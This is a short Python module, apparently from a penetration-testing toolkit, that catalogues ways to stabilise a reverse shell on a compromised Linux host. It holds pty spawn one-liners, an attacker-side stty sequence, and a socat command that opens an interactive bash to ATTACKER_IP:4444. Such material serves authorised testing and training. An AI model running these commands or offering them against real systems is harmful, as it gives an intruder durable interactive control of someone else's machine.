"""Linux shell stabilization techniques"""

def get_linux_techniques():
    """
    Get all Linux shell stabilization techniques
    Returns: Dict of techniques
    """
    techniques = {
        'python_pty': {
            'name': 'Python PTY Spawn',
            'commands': [
                'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                'python -c \'import pty; pty.spawn("/bin/bash")\'',
            ],
            'notes': 'Most reliable method if Python is available'
        },
        'script': {
            'name': 'Script Command PTY',
            'commands': [
                '/usr/bin/script -qc /bin/bash /dev/null',
                'script -q /dev/null -c bash'
            ],
            'notes': 'Works when Python is not available'
        },
        'expect': {
            'name': 'Expect Spawn',
            'commands': [
                'expect -c "spawn /bin/bash; interact"'
            ],
            'notes': 'Requires expect to be installed'
        },
        'socat': {
            'name': 'Socat PTY',
            'commands': [
                'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444'
            ],
            'notes': 'Most fully-featured if socat is available'
        },
        'full_tty': {
            'name': 'Full Interactive TTY',
            'commands': [
                '# In reverse shell:',
                'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                'export TERM=xterm',
                'Ctrl+Z (background the shell)',
                '',
                '# On attacker machine:',
                'stty raw -echo; fg',
                'Press Enter twice',
                '',
                '# Back in reverse shell:',
                'reset',
                'export SHELL=bash',
                'export TERM=xterm-256color',
                'stty rows 38 columns 116  # Adjust to your terminal size'
            ],
            'notes': 'Full TTY with job control, tab completion, and proper signals'
        }
    }
    
    return techniques